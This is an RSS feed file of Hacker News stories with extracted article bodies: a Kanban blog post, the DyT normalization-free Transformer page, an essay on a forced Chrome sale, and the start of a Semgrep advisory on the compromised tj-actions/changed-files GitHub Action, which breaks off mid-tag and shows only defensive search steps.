<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sat, 15 Mar 2025 18:30:11 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Milk Kanban (160 pts)]]></title>
            <link>https://brodzinski.com/2025/03/milk-kanban.html</link>
            <guid>43373157</guid>
            <pubDate>Sat, 15 Mar 2025 15:32:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://brodzinski.com/2025/03/milk-kanban.html">https://brodzinski.com/2025/03/milk-kanban.html</a>, See on <a href="https://news.ycombinator.com/item?id=43373157">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">

<figure><img fetchpriority="high" decoding="async" width="1024" height="580" src="https://brodzinski.com/wp-content/uploads/kanban-1-1024x580.jpg" alt="" srcset="https://brodzinski.com/wp-content/uploads/kanban-1-1024x580.jpg 1024w, https://brodzinski.com/wp-content/uploads/kanban-1-400x227.jpg 400w, https://brodzinski.com/wp-content/uploads/kanban-1-768x435.jpg 768w, https://brodzinski.com/wp-content/uploads/kanban-1-1536x870.jpg 1536w, https://brodzinski.com/wp-content/uploads/kanban-1-2048x1161.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>When people say Kanban, they tend to think of a specific set of practices. Whiteboards &amp; sticky notes (both almost universally virtual). Tasks moving through columns that represent workflow. Every now and then, WIP limits even.</p>



<p>As often as we do it with other things, it reduces a broader principle to a set of oversimplified techniques, which, in turn, tend to underdeliver in many contexts.</p>



<h2>Kanban</h2>



<p>In its original meaning, Kanban represented a visual signal. The thing that communicated, well, something. It might have been a need, option, availability, capacity, request, etc.</p>



<p>In our Kanban systems, the actual Kanban is a sticky note.</p>



<p>It represents work, and given its closest environment (board, columns, other stickies, visual decorators), it communicates what needs, or needs not, to be done.</p>



<p>If it’s yellow, it’s a regular feature. If there’s a blocker on it, it requests focus. If there’s a long queue of neighbors, it suggests flow inefficiency. If it’s a column named “ready for…” it communicates available work and/or handoff.</p>



<p>A visual signal all the way.</p>



<h2>Visual Signals</h2>



<p>Let’s decouple ourselves from the most standard Kanban board design. Let’s forget columns, sticky notes, and all that jazz.</p>



<p>Enters Kasia, our office manager at Lunar. One of the many things Kasia takes care of is making sure we don’t run out of kitchen supplies. The tricky part is that when you don’t drink milk yourself, it becomes a pain to check the cupboard with milk reserves every now and then to ensure we’re stocked.</p>



<p>Then, one day, I found this.</p>



<figure><img decoding="async" width="1024" height="681" src="https://brodzinski.com/wp-content/uploads/milk-kanban-1-1024x681.jpg" alt="" srcset="https://brodzinski.com/wp-content/uploads/milk-kanban-1-1024x681.jpg 1024w, https://brodzinski.com/wp-content/uploads/milk-kanban-1-400x266.jpg 400w, https://brodzinski.com/wp-content/uploads/milk-kanban-1-768x510.jpg 768w, https://brodzinski.com/wp-content/uploads/milk-kanban-1-1536x1021.jpg 1536w, https://brodzinski.com/wp-content/uploads/milk-kanban-1-2048x1361.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>A simple index card taped to the last milk carton in a row stating, “Bring me to Kasia.” That’s it.</p>



<p>In the context, it really says that:</p>



<ul>
<li>we’re running out of (specific kind of) milk</li>



<li>we want to restock soon</li>



<li>there’s enough time to make an order (we don’t drink that much of cappuccinos and macchiatos)</li>
</ul>



<p>But it’s just a visual signal. Kanban at its very core.</p>



<h2>Simplicity is the King</h2>



<p>What Kasia designed is a perfect Kanban system. It relies on visual signals, which are put in the context. Even better, unlike most Kanban boards I see across teams, the system is self-explanatory. Everything one needs to know is written on the index card.</p>



<p>That’s, by the way, another characteristic of a good Kanban system. It should be as simple as possible (but not simpler). Our workflow representations <a href="https://brodzinski.com/2011/01/kanban-board-keep-it-simple.html">tend to get more and more complex over time by themselves</a>; we don’t need to make them so from the outset.</p>



<p>It’s a safe assumption that, almost always, there’s a simpler visualization that would work just as well. We, process designers, often fall into the trap of overengineering our tools.</p>



<p>And it’s a healthy wake-up call when someone who knows close to nothing about our fancy stuff designs a system that we would unlikely think of. One that is a perfect implementation of the original spirit, even if it doesn’t follow any of the common techniques.</p>



<p>Because it’s all about <a href="https://brodzinski.com/2014/08/practices-principles-values.html">principles, not practices</a>.</p>



<p>That’s what we can learn from Milk Kanban.</p>




				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Arbitrary-Scale Super-Resolution with Neural Heat Fields (106 pts)]]></title>
            <link>https://therasr.github.io/</link>
            <guid>43371583</guid>
            <pubDate>Sat, 15 Mar 2025 10:39:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://therasr.github.io/">https://therasr.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=43371583">Hacker News</a></p>
Couldn't get https://therasr.github.io/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Finland's National Allergy Program Successfully Reduces Allergic Diseases (170 pts)]]></title>
            <link>https://publications.ersnet.org/content/erj/49/6/1700470</link>
            <guid>43370956</guid>
            <pubDate>Sat, 15 Mar 2025 08:23:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://publications.ersnet.org/content/erj/49/6/1700470">https://publications.ersnet.org/content/erj/49/6/1700470</a>, See on <a href="https://news.ycombinator.com/item?id=43370956">Hacker News</a></p>
Couldn't get https://publications.ersnet.org/content/erj/49/6/1700470: Error [ERR_FR_TOO_MANY_REDIRECTS]: Maximum number of redirects exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Transformers Without Normalization (198 pts)]]></title>
            <link>https://jiachenzhu.github.io/DyT/</link>
            <guid>43369633</guid>
            <pubDate>Sat, 15 Mar 2025 03:12:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jiachenzhu.github.io/DyT/">https://jiachenzhu.github.io/DyT/</a>, See on <a href="https://news.ycombinator.com/item?id=43369633">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <!-- Figure Section -->
        <div id="figure">
                <p><img src="https://jiachenzhu.github.io/DyT/webpage_assets/before_after.svg" alt="Dynamic Tanh (DyT) as a replacement for normalization in Transformers"></p><p><em>Left:</em> original Transformer block. <em>Right:</em> block with our proposed Dynamic Tanh (DyT) layer. <br>
                    DyT is a straightforward replacement for commonly used Layer Norm or RMSNorm layers. <br>
                    Transformers with DyT match or exceed the performance of their normalized counterparts.
                </p>
            </div>

        <!-- Abstract Section -->
        <section id="abstract">
            <h2>Abstract</h2>
                <p>
                    Normalization layers are ubiquitous in modern neural networks and have long been considered essential.
                    This work demonstrates that Transformers without normalization can achieve the same or better performance using a remarkably simple technique.
                    We introduce Dynamic Tanh (DyT), an element-wise operation $$\mathrm{DyT}(\boldsymbol{x}) = \tanh(\alpha \boldsymbol{x}),$$ as a drop-in replacement for normalization layers in Transformers.
                    DyT is inspired by the observation that layer normalization in Transformers often produces tanh-like, S-shaped input-output mappings.
                    By incorporating DyT, Transformers without normalization can match or exceed the performance of their normalized counterparts, mostly without hyperparameter tuning.
                    We validate the effectiveness of Transformers with DyT across diverse settings, ranging from recognition to generation, supervised to self-supervised learning, and computer vision to language models.
                    These findings challenge the conventional understanding that normalization layers are indispensable in modern neural networks, and offer new insights into their role in deep networks.
                </p>
        </section>
        
        <!-- Implementation Section -->
        <section id="implementation">
            <h2>Implementation</h2>
            <p>
                DyT module can be implemented in a few lines of PyTorch code:
            </p>
            
            <div>
                <pre id="code-block-dyt"><code>class DyT(nn.Module):
    def __init__(self, num_features, alpha_init_value=0.5):
        super().__init__()
        self.alpha = nn.Parameter(torch.ones(1) * alpha_init_value)
        self.weight = nn.Parameter(torch.ones(num_features))
        self.bias = nn.Parameter(torch.zeros(num_features))
    
    def forward(self, x):
        x = torch.tanh(self.alpha * x)
        return x * self.weight + self.bias</code></pre>
            </div>
        </section>

        <!-- Key Findings Section -->
        <section id="key-findings">
            <h2>Key Findings</h2>
            
            <div>
                    
                            <h4>Layer Normalization Behaves Like Scaled Tanh Function</h4>
                            <p>Our analysis shows that layer normalization (LN) in Transformers generates input-output mappings that closely resemble scaled tanh functions. In the earlier layers, these mappings are mostly linear. However, in deeper layers, they take on distinct S-shaped curves characteristic of tanh functions.</p>
                            
                            <div>
                                <p><img src="https://jiachenzhu.github.io/DyT/webpage_assets/figures/inout_vit.png" alt="Input-output relationships in ViT normalization layers">
                                </p>
                                <p><img src="https://jiachenzhu.github.io/DyT/webpage_assets/figures/inout_w2v.png" alt="Input-output relationships in wav2vec 2.0 normalization layers">
                                </p>
                                <p><img src="https://jiachenzhu.github.io/DyT/webpage_assets/figures/inout_dit.png" alt="Input-output relationships in DiT normalization layers">
                                </p>
                                <p><em>Output vs. input of selected LN layers in Vision Transformer (ViT), wav2vec 2.0 (a Transformer model for speech), and Diffusion Transformer (DiT). We plot the input/output values of four LN layers in each model. The S-shaped curves highly resemble that of a tanh function.</em>
                                </p>
                            
                            </div>
                        
                </div>


        <!-- Evaluation Section -->
        <section id="evaluation">
            <h2>Evaluation</h2>
            <p>
                We present a comprehensive evaluation of DyT across a diverse range of architectures and tasks, highlighting its effectiveness and generalizability.  
                Our experiments cover supervised learning in vision (<b>ViT</b> and <b>ConvNeXt</b>), self-supervised learning in vision (<b>MAE</b> and <b>DINO</b>), diffusion models (<b>DiT</b>), large language models (<b>LLaMA</b>), self-supervised learning in speech (<b>wav2vec 2.0</b>), and DNA sequence modeling (<b>HyenaDNA</b> and <b>Caduceus</b>).  
                In every case, Transformers with DyT achieves similar or better performance than their normalized counterparts.  
                For detailed results and comparisons, please refer to our paper.    
            </p>
        </section>                    
                        

            

        <!-- Resources Section -->
        <section id="resources">
            <h2>Resources</h2>
            <div>
                <div>
                            <h5><i></i>Paper</h5>
                            <p>Download our paper for all the details about our research.</p>
                            <p><a href="https://arxiv.org/abs/2503.10622">Download Paper</a>
                        </p></div>
                <div>
                            <h5><i></i>Code</h5>
                            <p>Check out our repository for implementation details.</p>
                            <p><a href="https://github.com/jiachenzhu/DyT">View on GitHub</a>
                        </p></div>
                <div>
                            <h5><i></i>Summary</h5>
                            <p>Read a concise summary of our research findings on X.</p>
                            <p><a href="https://x.com/liuzhuang1234/status/1900370738588135805">View Summary</a>
                        </p></div>
            </div>
        </section>

        <!-- Citations Section -->
        <!-- Citations Section -->
<!-- Citations Section -->
<section id="citations">
    <h2>BibTeX</h2>
            <div>
                <pre id="code-block-citation"><code>@inproceedings{Zhu2025DyT,
  title={Transformers without Normalization},
  author={Zhu, Jiachen and Chen, Xinlei and He, Kaiming and LeCun, Yann and Liu, Zhuang},
  booktitle={Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},
  year={2025}
}</code></pre>

    </div>
</section>

        <section>
            <h2>Correspondence</h2>
            <div>
                <p>jiachen [dot] zhu [at] nyu [dot] edu</p>
                <p>zhuangl [at] princeton [dot] edu</p>
                <!-- <p></p> -->
            </div>
        </section>
    </section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google Being Forced to Sell Chrome Is Not Good for the Web (173 pts)]]></title>
            <link>https://chriscoyier.net/2025/03/14/google-being-forced-to-sell-chrome-is-not-good-for-the-web/</link>
            <guid>43369230</guid>
            <pubDate>Sat, 15 Mar 2025 01:57:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chriscoyier.net/2025/03/14/google-being-forced-to-sell-chrome-is-not-good-for-the-web/">https://chriscoyier.net/2025/03/14/google-being-forced-to-sell-chrome-is-not-good-for-the-web/</a>, See on <a href="https://news.ycombinator.com/item?id=43369230">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
<p>You’ve got a monopoly on lemonade because you pay all the grocery stores to be the default lemonade. </p>



<p>So we’re going to force you sell your car. </p>



<p>What’s with the weird redirect? If the monopoly is directly caused by paying the grocery stores for placement, then stop <em>that part.</em> </p>



<p>We can see this exact redirect happening in the ruling in the U.S. vs Google court case.</p>



<blockquote>
<div><p>Google is a monopolist, and it has acted as one to maintain its monopoly. </p><p>[…]</p><p>For years, Google has secured default placements through distribution contracts. It has entered into such agreements with browser developers, mobile device manufacturers, and wireless carriers.</p><p>[…]</p><p>Because many users simply stick to searching with the default, Google receives billions of queries every day through those access points. </p></div>
<cite>Judge Mehta</cite></blockquote>



<p>In the document:</p>







<p>It’s spelled out quite clearly that being the default is the monopolistic part and that’s caused by paying for it (which is then self-perpetuating as the placement is so valuable, the money generated by it pays for those default placements.)</p>



<p>Fair enough! Let’s stop that. </p>



<p>Let’s stop the monopoly by telling Google they can’t pay (certain? all?) companies to be the default search engine anymore. A step further could be forcing browsers should ask users what they want their default search engine to be.</p>



<p>This would be in line with how Apple was forced to <a href="https://developer.apple.com/support/browser-choice-screen/">allow for browser choice</a>:</p>



<figure><img data-recalc-dims="1" fetchpriority="high" decoding="async" width="1024" height="612" data-attachment-id="12076" data-permalink="https://chriscoyier.net/2025/03/14/google-being-forced-to-sell-chrome-is-not-good-for-the-web/screenshot-2025-03-12-at-12-52-03-pm/" data-orig-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-12-at-12.52.03%E2%80%AFPM.png?fit=1620%2C968&amp;ssl=1" data-orig-size="1620,968" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2025-03-12 at 12.52.03 PM" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-12-at-12.52.03%E2%80%AFPM.png?fit=300%2C179&amp;ssl=1" data-large-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-12-at-12.52.03%E2%80%AFPM.png?fit=1024%2C612&amp;ssl=1" src="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-12-at-12.52.03%E2%80%AFPM.png?resize=1024%2C612&amp;ssl=1" alt="" srcset="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-12-at-12.52.03%E2%80%AFPM.png?resize=1024%2C612&amp;ssl=1 1024w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-12-at-12.52.03%E2%80%AFPM.png?resize=300%2C179&amp;ssl=1 300w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-12-at-12.52.03%E2%80%AFPM.png?resize=768%2C459&amp;ssl=1 768w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-12-at-12.52.03%E2%80%AFPM.png?resize=1536%2C918&amp;ssl=1 1536w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-12-at-12.52.03%E2%80%AFPM.png?w=1620&amp;ssl=1 1620w" sizes="(max-width: 1000px) 100vw, 1000px"></figure>



<p>That’s a straight line from problem to solution. </p>



<p>A weird curvy-ass line between problem and solution is this strange solution that is being relentlessly proposed that Google should be forced to <em>sell Chrome.</em></p>



<p>There is a recent round of news covering this that all point to the curvy-ass-line solution. </p>



<ul>
<li><a href="https://www.usatoday.com/story/tech/2025/03/11/google-sell-chrome-doj-antitrust/82277792007/">USA Today</a>: “Google&nbsp;will have to part with its dominant Chrome browser if&nbsp;the U.S. Department of Justice&nbsp;has its way.”</li>



<li><a href="https://www.wired.com/story/the-doj-still-wants-google-to-divest-chrome/">WIRED</a>: “the Department of Justice reiterated that Google should stop paying partners for search placement—and divest its dominant Chrome browser.”</li>



<li><a href="https://arstechnica.com/google/2025/03/doj-google-must-sell-chrome-android-could-be-next/">Ars Technica</a>: “the government maintains that Chrome must go if the playing field is to be made level again.”</li>
</ul>



<p>It’s true that Chrome ships with Google as the default search engine, because, ya know, they invested billions in Chrome and that’s how business works. But still, a more direct line from problem to solution is forcing default search engine choice, not a forced sale of Chrome itself. </p>



<p>Why do I care? The sale of Chrome is bad for the web.</p>



<p><a href="https://chriscoyier.net/2025/01/29/a-little-arm-chair-businessin-about-chrome/">I’ve written before</a> that Chrome is unusual in that it’s really only particularly useful to Google:</p>



<blockquote>
<p>Users don’t pay for Chrome. There aren’t ads in Chrome. There is no&nbsp;<em>direct</em>&nbsp;business model for Chrome. Unlike Safari and Firefox, nobody writes checks to Chrome to make a certain search engine the default.</p>



<p>The value of Chrome is all tangential — it provides value to Google. Whoever buys it does not inherit that same tangential value, they would need to redirect what little of it they can somewhere else, likely fighting against the natural flow that has been baked into it since the beginning.</p>
</blockquote>



<p>I’m not saying Google shouldn’t be forced to sell Chrome just because it’s only valuable to Google. But I do think Google should be allowed to have a browser. Google is a web business, that’s their whole thing. They <em>made</em> a browser to invest in the web itself because what is good for the web is good for Google, and happens to be good for all of us. </p>



<p>Allow me to be more clear about why Chrome is good for all of us. </p>



<p>When you look at (or otherwise experience) anything on a digital device, you’re looking at an operating system. That operating system was probably made by a private company who has total control over it. They have the right to do that, but that operating system exists to serve that company only and entirely. </p>



<p>If you make a native app for mobile devices, it is at the pleasure of the companies who build mobile operating systems and you’ll do it with the technology they allow. Making an app for iOS vs Android is super different and the companies behind them and never going to shake hands and make it easier for developers. It’s largely the same making a native app for desktop computers. While there is a bit more freedom of what you can install there, making a macOS app and a Windows app is two entirely separate endeavors. </p>



<p>Not so with the web. The web is a set of protocols and languages and file formats and other technology that congeal to make digital experiences. No one company owns or controls it. It is designed to be open and it’s <em>good</em> when companies build new things and support web standards. It’s a modern miracle that we have such a thing and it’s on us to protect it. </p>



<p>If I go to a <em>website</em> on iOS, Android, macOS, Windows, some Linux distro, my Samsung phone, or whatever device I have that has a web browser on it,<strong> it really is the same set of files</strong> that deliver that experience. You and I and every company in the world can build things once that go everywhere. That’s how it should be. It’s fair and efficient. It’s good for the world. It’s much better than a world where we are forced to build things only for companies proprietary operating systems.</p>



<p>Google, by virtue of having Chrome, invests heavily in <em>the web itself.</em> Not just Chrome-the-browser, but the web standards that power the web. I can’t claim to know every detail of that investment, but I personally know people employed by Google that literally just try to make the web better all day. </p>



<p>It’s not hard to poke around the W3C specs themselves and see them littered with Google employees. </p>



<figure data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/chriscoyier.net\/2025\/03\/14\/google-being-forced-to-sell-chrome-is-not-good-for-the-web\/&quot;}">
<figure><img data-recalc-dims="1" decoding="async" width="1024" height="820" data-attachment-id="12105" data-permalink="https://chriscoyier.net/2025/03/14/google-being-forced-to-sell-chrome-is-not-good-for-the-web/screenshot-2025-03-14-at-8-23-29-am/" data-orig-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.23.29%E2%80%AFAM.png?fit=1064%2C852&amp;ssl=1" data-orig-size="1064,852" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2025-03-14 at 8.23.29 AM" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.23.29%E2%80%AFAM.png?fit=300%2C240&amp;ssl=1" data-large-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.23.29%E2%80%AFAM.png?fit=1024%2C820&amp;ssl=1" data-id="12105" src="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.23.29%E2%80%AFAM.png?resize=1024%2C820&amp;ssl=1" alt="" srcset="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.23.29%E2%80%AFAM.png?resize=1024%2C820&amp;ssl=1 1024w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.23.29%E2%80%AFAM.png?resize=300%2C240&amp;ssl=1 300w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.23.29%E2%80%AFAM.png?resize=768%2C615&amp;ssl=1 768w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.23.29%E2%80%AFAM.png?w=1064&amp;ssl=1 1064w" sizes="(max-width: 1000px) 100vw, 1000px"></figure>



<figure><img data-recalc-dims="1" decoding="async" width="812" height="462" data-attachment-id="12103" data-permalink="https://chriscoyier.net/2025/03/14/google-being-forced-to-sell-chrome-is-not-good-for-the-web/screenshot-2025-03-14-at-8-22-26-am/" data-orig-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.22.26%E2%80%AFAM.png?fit=812%2C462&amp;ssl=1" data-orig-size="812,462" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2025-03-14 at 8.22.26 AM" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.22.26%E2%80%AFAM.png?fit=300%2C171&amp;ssl=1" data-large-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.22.26%E2%80%AFAM.png?fit=812%2C462&amp;ssl=1" data-id="12103" src="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.22.26%E2%80%AFAM.png?resize=812%2C462&amp;ssl=1" alt="" srcset="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.22.26%E2%80%AFAM.png?w=812&amp;ssl=1 812w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.22.26%E2%80%AFAM.png?resize=300%2C171&amp;ssl=1 300w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.22.26%E2%80%AFAM.png?resize=768%2C437&amp;ssl=1 768w" sizes="(max-width: 812px) 100vw, 812px"></figure>



<figure><img data-recalc-dims="1" loading="lazy" decoding="async" width="812" height="490" data-attachment-id="12104" data-permalink="https://chriscoyier.net/2025/03/14/google-being-forced-to-sell-chrome-is-not-good-for-the-web/screenshot-2025-03-14-at-8-20-27-am/" data-orig-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.20.27%E2%80%AFAM.png?fit=812%2C490&amp;ssl=1" data-orig-size="812,490" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2025-03-14 at 8.20.27 AM" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.20.27%E2%80%AFAM.png?fit=300%2C181&amp;ssl=1" data-large-file="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.20.27%E2%80%AFAM.png?fit=812%2C490&amp;ssl=1" data-id="12104" src="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.20.27%E2%80%AFAM.png?resize=812%2C490&amp;ssl=1" alt="" srcset="https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.20.27%E2%80%AFAM.png?w=812&amp;ssl=1 812w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.20.27%E2%80%AFAM.png?resize=300%2C181&amp;ssl=1 300w, https://i0.wp.com/chriscoyier.net/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-8.20.27%E2%80%AFAM.png?resize=768%2C463&amp;ssl=1 768w" sizes="auto, (max-width: 812px) 100vw, 812px"></figure>
</figure>



<p>And there are evangelists, and documentation writers, and other people who aren’t working directly on Chrome, but really the web itself. </p>



<p>Will Google continue to invest like this if they are forced to sell Chrome? It would be hard to blame them if they did not. </p>



<p>Assuming they find a buyer, that buyer will be scrambling to find a way to make that investment worth it. Will they be choosing to employ people who are just <em>abstractly making the web better?</em> I would think not. </p>



<p>The web will suffer should Google be forced to sell Chrome. I think a fair assumption that overall investment and contribution to the open web will take a dive. </p>



<p>Sure, there will be some canonical fork of Chromium that keeps the sure-to-be-shunned buyer company out of it. Sure, the <a href="https://www.linuxfoundation.org/press/linux-foundation-announces-the-launch-of-supporters-of-chromium-based-browsers">Linux Foundation is getting their ducks in a row</a> to have contributors ready. But I can’t see it going well. </p>



<p>It won’t happen overnight, but stagnation will set in. A stagnated web is incentive for the operating system makers of the world to invest in pulling developers toward those proprietary systems. The browser wars sucked but at least we were still making websites. Being <em>forced</em> to make proprietary apps to reach people is an expensive prospect for the rest of us companies of the world, it will probably be done poorly, and we’ll all suffer for it. Heck, those operating systems aren’t required to ship a web browser <em>at all.</em></p>



<p>Whatever way this goes is bad for Mozilla. It’s possible Google is forced to not pay them for default search engine placement anymore, but even if they aren’t, you can imagine Google’s appetite for cutting that check is severely diminished. Mozilla’s <a href="https://arstechnica.com/information-technology/2020/08/firefox-maker-mozilla-lays-off-250-workers-says-covid-19-lowered-revenue/">2020 layoffs</a> that was publicly about reducing platform development still has me thinking they aren’t entirely serious about pushing the web forward, particularly with much less help. </p>



<p>And bad things happening for Mozilla is <em>also</em> bad for the web, so another domino may fall. Diminishing investments in the web generally will keep knocking over dominos. </p>



<p>I’ve typed enough. Google does all kinds of shitty stuff. Their surely the worst offenders of user surveillance on the web. Let’s not let them off the hook on that. Let’s see the DOJ get involved in that stuff. But forcing a sale of Chrome is not the way. </p>


        
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Popular GitHub Action tj-actions/changed-files is compromised (268 pts)]]></title>
            <link>https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/</link>
            <guid>43368870</guid>
            <pubDate>Sat, 15 Mar 2025 00:43:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/">https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/</a>, See on <a href="https://news.ycombinator.com/item?id=43368870">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <p>Popular GitHub Action <a rel="noopener noreferrer" href="https://github.com/tj-actions/changed-files">tj-actions/changed-files</a>&nbsp;has been compromised (<a rel="noopener noreferrer" href="https://github.com/tj-actions/changed-files/issues/2463">GitHub issue</a>) with a payload that appears to attempt to dump secrets, impacting thousands of CI pipelines.&nbsp;This isn’t the first security issue with tj-actions/changed-files—see prior vulnerability <a rel="noopener noreferrer" href="https://www.cve.org/CVERecord?id=CVE-2023-51664">CVE-2023-51664</a>.</p><h3>What you should do</h3><ol start="1"><li><p><strong>Find out where you're affected</strong></p><ol start="1"><li><p>The simplest way to find this is to grep for <code>tj-actions</code> in your codebase.</p></li><li><p>If you're on GitHub, look at the results of this query, replacing YOURORG with your organization's name on GitHub:&nbsp;<br><a href="https://github.com/search?q=org%3A">https://github.com/search?q=org%3A</a><a href="https://github.com/search?q=org%3A%3CYOURORG%3E+uses%3A+tj-actions%2F&amp;type=code">&lt;YOURORG&gt;+uses%3A+tj-actions%2F&amp;type=code</a></p></li><li><p>Arguably, Semgrep is overkill for this case. But Lewis Ardern on our team <a href="https://semgrep.dev/playground/r/10Uz5qo/semgrep.tj-actions-compromised">wrote a Semgrep rule to find usages of tj-actions</a>, which you can run locally (without sending code to the cloud) via: <code>semgrep --config r/10Uz5qo/semgrep.tj-actions-compromised</code>. And if we find more information about what tags &amp; commits are affected, we can update the rule over time to become more precise about whether or not you could be impacted. At time of writing, it looks like all versions are compromised.</p></li><li><p>For users of <a href="https://semgrep.dev/login">Semgrep AppSec Platform</a>, we recommend placing <a 